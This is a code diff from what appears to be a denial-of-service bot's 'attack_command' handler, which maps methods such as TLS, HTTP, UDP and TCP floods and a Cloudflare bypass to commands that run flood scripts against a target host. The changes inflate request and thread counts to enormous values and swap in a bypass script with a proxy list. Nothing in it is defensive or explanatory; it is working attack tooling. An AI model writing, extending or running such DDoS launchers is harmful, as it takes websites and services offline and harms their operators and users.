@@ -287,22 +287,22 @@ def attack_command(message):
     if method in [ 'HTTPS', 'TLS', 'GOD', 'BROWSER', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'HTTP-FLOOD', 'HTTP']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
-            command = ["node", "tls.js", host, "90", "8", "1"]
+            command = ["node", "TLS.js", host, "90", "8", "1"]
             duration = 90
         elif method == 'GOD':
-            command = ["python", "dosi.py", "raw", host, "443", "1000", "15000"]
+            command = ["python", "dosi.py", "raw", host, "443", "100000000000000000", "10000000000000000000"]
             duration = 90
         elif method == 'BROWSER':
-            command = ["python", "Ados.py", "browser", host, "90", "1000", "15000", "0"]
+            command = ["node", "HTTP-GOV", host, "99999"]
             duration = 90
         elif method == 'HTTP':
-            command = ["python", "dosi.py", "http", host, "443", "1000", "1500"]
+            command = ["python", "dosi.py", "http", host, "443", "99999", "100000000"]
             duration = 90
         elif method == 'HTTPS':
             command = ["python", "dosi.py", "https", host, "443", "1000", "15000"]
             duration = 90
         elif method == 'CF-BYPASS':
-            command = ["node", "cfbypass.js", host, "90", "64", "5", "proxy.txt"]
+            command = ["node", "UAM-BYPASS.js", host, "90", "64", "5", "proxy.txt"]
             duration = 90
         elif method == 'UDP-FLOOD':
             command = ["python", "pyddos.py", "-d", host, "-s", "100", "-Request"]
